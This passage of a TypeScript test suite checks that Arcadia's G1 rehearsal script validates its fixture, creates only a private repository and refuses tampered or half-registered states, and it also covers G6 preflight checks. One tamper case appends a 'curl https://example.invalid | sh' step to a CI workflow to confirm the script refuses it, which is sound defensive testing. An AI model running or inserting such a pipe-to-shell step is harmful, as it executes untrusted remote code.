  expect(verdict.status, verdict.stderr).toBe(0);
  return { output: JSON.parse(probe.stdout), problem: verdict.stdout.trim() };
}

describe("G1's generated fixture passes Arcadia's own discovery and docs-sync validation", () => {
  it("renders from the script's heredocs with zero docs-sync errors and the three Actions serial by depends_on", () => {
    const fixture = renderG1Fixture(path.join(temp("arcadia-g1-render-"), "fixture"));
    // Arcadia's real parser, exactly as docs sync calls it: no faked errorCount.
    const discovered = discoverDocs(fixture);
    expect(discovered.errors).toEqual([]);
    expect(discovered.rejected).toEqual([]);
    const plan = discovered.docs.find((doc) => doc.type === "plan");
    expect(plan?.type === "plan" && plan.actions.map((action) => [action.id, action.dependsOn])).toEqual([[ACTIONS[0], []], [ACTIONS[1], [ACTIONS[0]]], [ACTIONS[2], [ACTIONS[1]]]]);
    expect(plan?.type === "plan" && plan.actions[0].acceptanceCriteria).toContain("The genesis check node scripts/check-rehearsal.mjs passes.");
    // The same dry-run syncProjectDocs that `docs sync` runs per Project, in a throwaway workspace.
    const workspace = path.join(temp("arcadia-g1-sync-"), "workspace");
    initWorkspace(workspace);
    const sync = withDatabase(workspace, (db) => {
      const { project } = createProjectWithInitialWork(db, { name: "Three Action Rehearsal", mission: "m", goal: "g", status: "active", currentMilestone: "m", nextAction: "n", workClassification: "agent" });
      expect(project.slug).toBe("three-action-rehearsal");
      return syncProjectDocs(db, project, { apply: false, repoRoot: fixture });
    });
    expect(sync.errors).toEqual([]);
    expect(sync.rejected).toEqual([]);
    const readySet = resolveReadySet(fixture, "three-action-rehearsal");
    expect(readySet.ready.map((entry) => entry.actionId)).toEqual([ACTIONS[0]]);
    for (const candidate of readySet.candidates.slice(1)) {
      expect(candidate).toMatchObject({ ready: false, gate: null });
      expect(candidate.blockers.length).toBeGreaterThan(0);
      expect(candidate.blockers.every((blocker) => blocker.field.endsWith(".depends_on"))).toBe(true);
    }
    // And G1's own validation probe and rules agree.
    const { output, problem } = g1Validation(fixture);
    expect(output).toMatchObject({ importSlug: "three-action-rehearsal", errorCount: 0, ready: [ACTIONS[0]] });
    expect(problem).toBe("");
  });

  it("G1's validation names the invalid YAML criterion the pre-validation draft wrote", () => {
    expect(source(G1)).toContain(FIXED_CRITERION);
    const fixture = renderG1Fixture(path.join(temp("arcadia-g1-render-"), "fixture"), source(G1).replace(FIXED_CRITERION, PRE_FIX_CRITERION));
    expect(discoverDocs(fixture).errors.map((error) => error.message).join("\n")).toContain("Invalid YAML");
    const { output, problem } = g1Validation(fixture);
    expect(output.errorCount).toBeGreaterThan(0);
    expect(problem).toContain("Invalid YAML");
    expect(problem).toContain("not exactly [write-start-marker]");
  });
});

describe("G1 creates only the named private repository and reuses it only at genesis", () => {
  const REPO = "pmark/arcadia-three-action-rehearsal-t1";
  const ROOT_EXEC = 'git -C "$HOME/tmp/arcadia-three-action-rehearsal" rev-list --max-parents=0 HEAD';
  // Arcadia's validation, Project registry, metadata, docs sync and work list are the real code,
  // against the box's throwaway workspace; only GitHub, production status, the workspace
  // resolution and packet seeding are canned.
  const common = (): Replies => ({
    "arcadia production status": status("inactive"),
    "arcadia workspace resolve": { stdout: JSON.stringify({ ok: true, data: { source: "user config", workspacePath: "/w/martianrover" } }) },
    "probe fixture": { passthrough: "probe" },
    "arcadia project list": { passthrough: "cli" },
    "arcadia project import": { passthrough: "cli" },
    "arcadia project metadata": { passthrough: "cli" },
    "arcadia docs sync": { passthrough: "cli" },
    "arcadia work list": { passthrough: "cli" },
    "gh api user": { stdout: "pmark\n" },
    "gh config get git_protocol": { stdout: "https\n" },
    [`gh api repos/${REPO}/commits/main`]: { exec: ROOT_EXEC },
    "arcadia work plan": ok({ buildApproval: { id: "review_1" } }),
    "arcadia review show": ok({ item: { status: "open" } })
  });
  const setReplies = (box: ReturnType<typeof sandboxFor>, replies: Replies) => {
    for (const file of readdirSync(box.root).filter((f) => f.startsWith("counter-"))) rmSync(path.join(box.root, file));
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify(replies));
    writeFileSync(path.join(box.root, "calls.log"), "");
  };
  // The throwaway checkout carries its own managed PROJECT.md, as the real one does, so discovery
  // over it after a run proves nothing G1 leaves under runs/ is found (or sorted ahead of it).
  const CHECKOUT_PROJECT = "---\narcadia: v1\ntype: project\nslug: arcadia\nname: Arcadia\nstatus: active\ngoal: Checkout under test.\noutcome: Checkout under test.\nmilestone: Test\nupdated: 2026-10-04\n---\n\n# Arcadia\n";
  const g1Box = () => {
    const box = sandboxFor(G1, {});
    writeFileSync(path.join(box.checkout, "PROJECT.md"), CHECKOUT_PROJECT);
    commitAll(box.checkout, "project");
    git(box.checkout, ["push", "-q", "origin", "main"]);
    initWorkspace(path.join(box.root, "workspace"));
    return box;
  };
  const checkoutDiscovers = (box: ReturnType<typeof sandboxFor>) => discoverDocs(box.checkout).docs.map((doc) => doc.relativePath);
  const expectOnlyCheckoutDocs = (box: ReturnType<typeof sandboxFor>) => {
    expect(box.runDirs().length).toBeGreaterThan(0);
    expect(checkoutDiscovers(box)).toEqual(["PROJECT.md"]);
    expect(discoverDocs(box.checkout).errors).toEqual([]);
  };
  const notFound = { status: 1, stderr: `GraphQL: Could not resolve to a Repository with the name '${REPO}'.` };
  const fixtureOf = (box: ReturnType<typeof sandboxFor>) => path.join(box.home, "tmp", "arcadia-three-action-rehearsal");
  const noMutation = (box: ReturnType<typeof sandboxFor>) => {
    expect(box.calls()).not.toMatch(/"repo","create"|^git .*push/m);
    expect(arcadiaCallsFor(box, "project", "import")).toHaveLength(0);
    expect(arcadiaCallsFor(box, "project", "metadata")).toHaveLength(0);
    expect(arcadiaCallsFor(box, "docs", "sync")).toHaveLength(0);
  };

  it("creates the repository private, pushes only genesis without force, registers the fixture, then reuses it at genesis", () => {
    const box = g1Box();
    setReplies(box, {
      ...common(),
      "gh repo view": [notFound, { stdout: JSON.stringify({ visibility: "PRIVATE", isPrivate: true, isEmpty: true }) }],
      "gh repo create": { stdout: "" }
    });
    const first = box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO });
    expect(first.status, first.stdout + first.stderr).toBe(0);
    const { dir: firstDir, json: firstReceipt } = box.receipt();
    expectOnlyCheckoutDocs(box);
    expect(firstReceipt).toMatchObject({ outcome: "succeeded", githubRepository: REPO, githubRepositoryCreated: true, githubRepositoryChanged: true, productionPreviewedOrActivated: false, registrationState: "none", firstPacketApproval: "review_1" });
    const fixture = fixtureOf(box);
    expect(firstReceipt.projectId).toBe(readFileSync(path.join(fixture, ".git", "arcadia-three-action-project-id"), "utf8").trim());
    // The real docs sync applied the fixture with zero errors.
    expect(JSON.parse(readFileSync(path.join(firstDir, "docs-sync.json"), "utf8")).data.errorCount).toBe(0);
    const recover = `ARCADIA_WORKSPACE=/w/martianrover ${realpathSync(box.scripts)}/recover-arcadia-host-services.sh run`;
    expect(firstReceipt.recoverCommand).toBe(recover);
    expect(first.stdout).toContain(`  ${recover}\n`);
    expect(first.stdout).toMatch(/never exported/);
    // Validation ran before any GitHub call, create, push or import.
    const sequence = box.calls().trim().split("\n").map((line) => line.startsWith("git ") ? "push" : line.includes('"tsx"') ? "validate" : line.startsWith("gh ") ? "gh" : line.includes('"import"') ? "import" : "other");
    expect(sequence.indexOf("validate")).toBeGreaterThan(-1);
    expect(sequence.indexOf("validate")).toBeLessThan(sequence.indexOf("gh"));
    expect(sequence.indexOf("gh")).toBeLessThan(sequence.indexOf("push"));
    expect(sequence.indexOf("push")).toBeLessThan(sequence.indexOf("import"));
    // The committed fixture is byte-for-byte the validated scratch render.
    for (const file of ["PROJECT.md", "docs/plans/autonomous-three-action-rehearsal.md", ".arcadia-three-action-rehearsal.json"]) {
      expect(readFileSync(path.join(fixture, file), "utf8")).toBe(readFileSync(path.join(firstDir, ".fixture-render", file), "utf8"));
    }
    const calls = parsedCalls(box);
    const creates = calls.filter((c) => c.tool === "gh" && c.args[0] === "repo" && c.args[1] === "create");
    expect(creates).toHaveLength(1);
    expect(creates[0].args.slice(0, 4)).toEqual(["repo", "create", REPO, "--private"]);
    const description = creates[0].args[creates[0].args.indexOf("--description") + 1];
    const pushes = box.calls().split("\n").filter((l) => l.startsWith("git "));
    expect(pushes).toHaveLength(1);
    expect(pushes[0]).toMatch(/push -q -u origin main$/);
    expect(pushes[0]).not.toMatch(/--force|\s-f\b/);
    expect(box.calls()).not.toMatch(/production","(preview|activate)/);

    expect(git(fixture, ["remote", "get-url", "origin"])).toBe(`https://github.com/${REPO}.git`);
    expect(git(fixture, ["rev-list", "--count", "HEAD"])).toBe("1");
    expect(git(fixture, ["ls-files"]).split("\n").sort()).toEqual([
      ".arcadia-three-action-rehearsal.json", ".github/workflows/ci.yml", "AGENTS.md", "CONSTITUTION.md", "PROJECT.md",
      "docs/plans/autonomous-three-action-rehearsal.md", "scripts/check-rehearsal.mjs"
    ]);
    const ci = readFileSync(path.join(fixture, ".github", "workflows", "ci.yml"), "utf8");
    expect(ci).toContain("runs-on: ubuntu-latest");
    expect(ci).not.toMatch(/coderabbit/i);
    const plan = readFileSync(path.join(fixture, "docs", "plans", "autonomous-three-action-rehearsal.md"), "utf8");
    expect(plan.match(/^ {2}- id: (\S+)$/gm)).toEqual(["  - id: write-start-marker", "  - id: transform-start-marker", "  - id: verify-final-rehearsal"]);
    expect(plan).toContain("depends_on: [write-start-marker]");
    expect(plan).toContain("depends_on: [transform-start-marker]");
    const check = (marker?: string) => {
      if (marker === undefined) rmSync(path.join(fixture, "MARKER.md"), { force: true });
      else writeFileSync(path.join(fixture, "MARKER.md"), marker);
      return spawnSync(process.execPath, ["scripts/check-rehearsal.mjs"], { cwd: fixture }).status;
    };
    expect(check()).toBe(0);
    expect(check("three-action rehearsal start\nTHREE-ACTION REHEARSAL START\n")).toBe(0);
    expect(check("three-action rehearsal start\nsomething else\n")).toBe(1);
    check();

    // Rerun with the same identifier: the repository now holds exactly this genesis.
    setReplies(box, {
      ...common(),
      "gh repo view": { stdout: JSON.stringify({ name: "arcadia-three-action-rehearsal-t1", owner: { login: "pmark" }, visibility: "PRIVATE", isPrivate: true, isArchived: false, isFork: false, isEmpty: false, description }) }
    });
    const second = box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO });
    expect(second.status, second.stdout + second.stderr).toBe(0);
    const [, secondDir] = box.runDirs().sort();
    expect(JSON.parse(readFileSync(path.join(secondDir, "receipt.json"), "utf8"))).toMatchObject({ outcome: "succeeded", githubRepositoryCreated: false, githubRepositoryChanged: false, registrationState: "registered_by_this_fixture", projectId: firstReceipt.projectId });
    expect(box.calls()).not.toMatch(/"repo","create"|^git .*push/m);
    expect(arcadiaCallsFor(box, "project", "import")).toHaveLength(0);
    expect(arcadiaCallsFor(box, "work", "plan")).toHaveLength(0);
    expectOnlyCheckoutDocs(box);
  });

  it("refuses an invalid generated Plan with a receipt and failure handoff before any GitHub call, create, push, import or manifest write", () => {
    const box = g1Box();
    rebind(box, G1, [[new RegExp(FIXED_CRITERION.replace(/[$.]/g, "\\$&")), PRE_FIX_CRITERION]]);
    setReplies(box, { ...common(), "gh repo view": notFound, "gh repo create": { stdout: "" } });
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "validate_fixture", githubRepositoryChanged: false, productionPreviewedOrActivated: false });
    expect(json.reason).toContain("fails Arcadia's own discovery and docs-sync validation");
    expect(json.reason).toContain("Invalid YAML");
    expect(json.reason).not.toContain("\n");
    expect(readFileSync(path.join(dir, "failure-handoff.md"), "utf8")).toContain("No GitHub repository was created or pushed by this run.");
    expect(box.calls()).not.toMatch(/^gh /m);
    noMutation(box);
    expect(existsSync(fixtureOf(box))).toBe(false);
    // The render a refusal leaves behind stays invisible to the checkout's own discovery...
    expectOnlyCheckoutDocs(box);
    // ...which it would not be at a non-dot path inside the run directory: there discovery finds
    // the fixture's PROJECT.md and sorts it ahead of the checkout's own.
    cpSync(path.join(dir, ".fixture-render"), path.join(dir, "fixture-render"), { recursive: true });
    expect(checkoutDiscovers(box)[0]).toBe(path.relative(box.checkout, path.join(dir, "fixture-render", "PROJECT.md")));
    rmSync(path.join(dir, "fixture-render"), { recursive: true });
  });

  it("reports a Project registered without this fixture's marker with an exact recovery instruction, before any GitHub call", () => {
    const box = g1Box();
    setReplies(box, { ...common(), "arcadia project list": ok({ projects: [{ id: "proj_9", slug: "three-action-rehearsal" }] }) });
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "registration_state", registrationState: "half_registered", registeredProjectId: "proj_9", githubRepositoryChanged: false });
    expect(json.reason).toMatch(/^HALF-REGISTERED: Project three-action-rehearsal \(proj_9\) is already registered in \/w\/martianrover, but the local fixture .* is missing/);
    expect(json.recovery).toContain(`move it back to ${fixtureOf(box)}`);
    expect(json.recovery).toContain("arcadia project show proj_9 --json");
    expect(json.recovery).toContain("Agent Ask proposal for a governed retirement");
    const handoff = readFileSync(path.join(dir, "failure-handoff.md"), "utf8");
    expect(handoff).toContain("## Recovery");
    expect(handoff).toContain(json.recovery);
    expect(box.calls()).not.toMatch(/^gh /m);
    noMutation(box);
  });

  // An earlier G1 committed (and may have pushed and registered) this genesis; by default the
  // pre-validation one with the invalid Plan.
  function earlierFixture(box: ReturnType<typeof sandboxFor>, options: { projectId?: string; script?: string; date?: string; mutate?: (fixture: string) => void } = {}) {
    const fixture = renderG1Fixture(fixtureOf(box), options.script ?? source(G1).replace(FIXED_CRITERION, PRE_FIX_CRITERION), REPO, options.date);
    options.mutate?.(fixture);
    git(fixture, ["init", "-q", "-b", "main"]);
    const root = commitAll(fixture, "genesis");
    git(fixture, ["remote", "add", "origin", `https://github.com/${REPO}.git`]);
    if (options.projectId) writeFileSync(path.join(fixture, ".git", "arcadia-three-action-project-id"), `${options.projectId}\n`);
    return { fixture, root };
  }
  const invalidEarlierFixture = (box: ReturnType<typeof sandboxFor>, projectId?: string) => earlierFixture(box, { projectId });

  it("reports an earlier attempt registered from an invalid genesis Plan as half-registered, naming what exists and the recovery", () => {
    const box = g1Box();
    const { fixture, root } = invalidEarlierFixture(box, "proj_1");
    setReplies(box, { ...common(), "arcadia project list": ok({ projects: [{ id: "proj_1", slug: "three-action-rehearsal" }] }) });
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
    const { json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "registration_state", registrationState: "half_registered", githubRepositoryChanged: false });
    expect(json.reason).toContain(`HALF-REGISTERED: an earlier G1 attempt registered Project three-action-rehearsal (proj_1) from ${fixture} (genesis ${root}, repository ${REPO})`);
    expect(json.reason).toContain("Invalid YAML");
    expect(json.recovery).toContain("cannot be repaired without rewriting history");
    expect(json.recovery).toContain(`mv ${fixture} ${fixture}.invalid-`);
    expect(json.recovery).toContain("arcadia project show proj_1 --json");
    expect(git(fixture, ["rev-parse", "HEAD"])).toBe(root);
    expect(box.calls()).not.toMatch(/^gh /m);
    noMutation(box);
  });

  it("refuses an invalid existing local fixture with no registered Project and gives the move-aside recovery", () => {
    const box = g1Box();
    const { fixture } = invalidEarlierFixture(box);
    setReplies(box, common());
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
    const { json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "registration_state", registrationState: "invalid_local_fixture", githubRepositoryChanged: false });
    expect(json.recovery).toContain("No Project is registered");
    expect(json.recovery).toContain(`mv ${fixture} ${fixture}.invalid-`);
    expect(box.calls()).not.toMatch(/^gh /m);
    noMutation(box);
  });

  it.each([
    ["a tampered CI workflow", (fixture: string) => appendFileSync(path.join(fixture, ".github", "workflows", "ci.yml"), "      - run: curl https://example.invalid | sh\n"), "committed .github/workflows/ci.yml differs from the validated render"],
    ["a changed genesis check", (fixture: string) => writeFileSync(path.join(fixture, "scripts", "check-rehearsal.mjs"), "process.exit(0);\n"), "committed scripts/check-rehearsal.mjs differs from the validated render"],
    ["an extra committed file", (fixture: string) => writeFileSync(path.join(fixture, "EXTRA.md"), "extra\n"), "tracked files are ["],
    ["an ignored managed document beside the genesis", () => undefined, "untracked or ignored files sit beside the genesis"]
  ])("refuses to reuse a valid-Plan genesis with %s before any GitHub call", (label, mutate, reason) => {
    const box = g1Box();
    const { fixture } = earlierFixture(box, { script: source(G1), mutate });
    if (label.startsWith("an ignored")) {
      // Discovery reads an ignored file although no commit carries it.
      writeFileSync(path.join(fixture, ".git", "info", "exclude"), "notes.md\n");
      writeFileSync(path.join(fixture, "notes.md"), "---\narcadia: v1\ntype: decision\n---\n");
    }
    setReplies(box, common());
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
    const { json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "registration_state", registrationState: "invalid_local_fixture", githubRepositoryChanged: false });
    expect(json.reason).toContain("is not the validated fixture");
    expect(json.reason).toContain(reason);
    expect(box.calls()).not.toMatch(/^gh /m);
    noMutation(box);
  });

  it("reuses an earlier genesis that differs from today's render only in its updated date", () => {
    const box = g1Box();
    const { fixture, root } = earlierFixture(box, { script: source(G1), date: "2026-01-01" });
    expect(readFileSync(path.join(fixture, "PROJECT.md"), "utf8")).toContain("updated: 2026-01-01");
    const description = source(G1).match(/^REPO_DESCRIPTION="(.*)"$/m)![1].replace("$REPO_MARKER", "arcadia-three-action-rehearsal-v1");
    setReplies(box, {
      ...common(),
      "gh repo view": { stdout: JSON.stringify({ name: "arcadia-three-action-rehearsal-t1", owner: { login: "pmark" }, visibility: "PRIVATE", isPrivate: true, isArchived: false, isFork: false, isEmpty: false, description }) }
    });
    const result = box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO });
    expect(result.status, result.stdout + result.stderr).toBe(0);
    expect(box.receipt().json).toMatchObject({ outcome: "succeeded", rootCommit: root, githubRepositoryChanged: false });
    expect(box.calls()).not.toMatch(/"repo","create"|^git .*push/m);
    expectOnlyCheckoutDocs(box);
  });

  it("refuses an exported ARCADIA_WORKSPACE by name before resolving the workspace", () => {
    const box = g1Box();
    setReplies(box, common());
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO, ARCADIA_WORKSPACE: "/w/martianrover" }).status).not.toBe(0);
    expect(box.receipt().json).toMatchObject({ outcome: "refused", stage: "preflight" });
    expect(box.receipt().json.reason).toContain("unset ARCADIA_WORKSPACE");
    expect(arcadiaCallsFor(box, "workspace", "resolve")).toHaveLength(0);
  });

  it("refuses an existing local fixture wired to another remote before any GitHub mutation", () => {
    const box = g1Box();
    const { fixture } = createFixture(box.home);
    git(fixture, ["remote", "set-url", "origin", "https://github.com/pmark/arcadia-three-action-rehearsal-other.git"]);
    setReplies(box, common());
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: REPO }).status).not.toBe(0);
    expect(box.receipt().json).toMatchObject({ outcome: "refused", stage: "local_fixture_state", githubRepositoryChanged: false });
    expect(box.calls()).not.toMatch(/^gh /m);
  });
});

describe("G6 preflight passes only when every observation is current, included and available", () => {
  const passingCapacity = { admitted: true, unattendedProof: true, freshness: "fresh", confidence: "observed", usagePolicy: "included", evidence: "real", availability: "available" };
  function passingBox(patch: (repo: string, root: string, boxRoot: string) => Replies = () => ({})) {
    const box = sandboxFor(G6, {});
    const head = git(box.checkout, ["rev-parse", "HEAD"]);
    // A zero-second check wait keeps the bounded loop to one read; nothing relies on the fake `sleep`.
    rebind(box, G6, [[/REQUIRED_COMMITS="[^"]+"/, `REQUIRED_COMMITS="${head}"`], [/^CHECK_WAIT_SECONDS=300$/m, "CHECK_WAIT_SECONDS=0"]]);
    const { root } = createFixture(box.home);
    const repo = FIXTURE_REPO_ID;
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({
      "arcadia workspace resolve": workspaceReply(box.root),
      "arcadia production status": status("inactive"),
      "arcadia go-broker status": ok({ ready: true, revision: head, preservationTransport: { ready: true }, agentGoTransport: { ready: true } }),
      "arcadia worker status": { stdout: "Worker: running (PID 7)\n" },
      "probe leases": { stdout: JSON.stringify({ active: 0, fixtureActive: [] }) },
      "probe claude": { stdout: JSON.stringify({ verdict: "signed_in" }) },
      "probe capacity": { stdout: JSON.stringify({ readOnlyReviewers: ["codex_planning"], codex: passingCapacity }) },
      "codex --version": { stdout: "codex 1.0\n" },
      "codex login status": { stdout: "Logged in using ChatGPT\n" },
      "gh auth status": { status: 0 },
      [`gh api repos/${repo}`]: { stdout: JSON.stringify({ private: true, archived: false, fork: false, default_branch: "main", permissions: { push: true } }) },
      [`gh api repos/${repo}/branches/main`]: { stdout: JSON.stringify({ commit: { sha: root }, protected: false }) },
      [`gh api repos/${repo}/commits/${root}/check-runs`]: { stdout: JSON.stringify({ total_count: 1, check_runs: [{ status: "completed", conclusion: "success" }] }) },
      ...patch(repo, root, box.root)
    }));
    return { box, head, root, repo };
  }
  const checkOf = (box: ReturnType<typeof sandboxFor>, name: string) => box.receipt().json.checks.find((c: { name: string }) => c.name === name);

  it("binds the receipt G7 needs when every check passes", () => {
    const { box, head, root, repo } = passingBox();
    const result = box.run();
    expect(result.status, result.stdout + result.stderr).toBe(0);
    const { json } = box.receipt();
    expect(json.checks.filter((c: { status: string }) => c.status !== "pass")).toEqual([]);
    expect(json).toMatchObject({ outcome: "succeeded", arcadiaHead: head, brokerRevision: head, githubRepository: repo, rootCommit: root, workspace: path.join(box.root, "martianrover"), policyRevision: 5, policyEpoch: 3 });
  });

  it.each([
    ["usage-limited", "refuse", { availability: "usage_limited" }],
    ["budget-limited", "refuse", { availability: "budget_limited" }],
    ["an observed capacity with unknown availability", "refuse", { availability: "unknown" }],
    ["simulated evidence", "refuse", { evidence: "simulated" }],
    ["an unrecognised evidence mode", "refuse", { evidence: "observed" }],
    ["an operator attestation, which carries no provider availability", "pass", { confidence: "attested", unattendedProof: false, availability: "unknown" }],
    ["an attested capacity that is usage-limited", "refuse", { confidence: "attested", availability: "usage_limited" }]
  ])("judges Codex capacity with %s as %s", (_label, verdict, override) => {
    const { box } = passingBox(() => ({ "probe capacity": { stdout: JSON.stringify({ readOnlyReviewers: ["codex_planning"], codex: { ...passingCapacity, ...override } }) } }));
    const result = box.run();
    expect(checkOf(box, "codex_capacity")).toMatchObject({ status: verdict });
    expect(result.status === 0).toBe(verdict === "pass");
  });

  it("reports an HTTP error reading genesis check runs once, as unreadable rather than 'none'", () => {
    const body = JSON.stringify({ message: "Not Found", documentation_url: "https://docs.github.com/rest", status: "404" });
    const { box } = passingBox((repo, root) => ({ [`gh api repos/${repo}/commits/${root}/check-runs`]: { status: 1, stdout: body, stderr: "gh: Not Found (HTTP 404)" } }));
    expect(box.run().status).not.toBe(0);
    const check = checkOf(box, "github_checks");
    expect(check.status).toBe("refuse");
    expect(check.detail).toContain("genesis CI checks are unreadable (the GitHub check-runs read failed)");
    expect(check.detail).not.toMatch(/none/);
  });

  it("refuses the repository when the main-branch read fails with an HTTP error, without mixing the error body into the verdict", () => {
    const body = JSON.stringify({ message: "Branch not found", status: "404" });
    const { box, root } = passingBox((repo) => ({ [`gh api repos/${repo}/branches/main`]: { status: 1, stdout: body } }));
    expect(box.run().status).not.toBe(0);
    expect(checkOf(box, "github_repository")).toMatchObject({ status: "refuse" });
    expect(checkOf(box, "github_repository").detail).toContain(`main at genesis ${root}`);
  });

  it("names an exported ARCADIA_WORKSPACE in the workspace refusal", () => {
    const { box } = passingBox((_repo, _root, boxRoot) => ({ "arcadia workspace resolve": ok({ source: "environment variable", workspacePath: path.join(boxRoot, "martianrover") }) }));
    expect(box.run({ ARCADIA_WORKSPACE: path.join(box.root, "martianrover") }).status).not.toBe(0);
    expect(checkOf(box, "workspace")).toMatchObject({ status: "refuse" });
    expect(checkOf(box, "workspace").detail).toContain("unset ARCADIA_WORKSPACE");
  });

  it("refuses a manifest repository outside the disposable pattern without reading it on GitHub", () => {
    const box = sandboxFor(G6, {});
    const { fixture } = createFixture(box.home);
    const manifest = path.join(fixture, ".arcadia-three-action-rehearsal.json");
    writeFileSync(manifest, JSON.stringify({ ...JSON.parse(readFileSync(manifest, "utf8")), githubRepository: "pmark/arcadia" }));
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({ "gh auth status": { status: 0 } }));
    expect(box.run().status).not.toBe(0);
    const verdicts = Object.fromEntries(box.receipt().json.checks.map((c: { name: string; status: string }) => [c.name, c.status]));
    expect(verdicts).toMatchObject({ fixture: "refuse", fixture_repository_identifier: "refuse", github_repository: "refuse" });
    expect(box.calls()).not.toMatch(/"api","repos\//);
  });
});
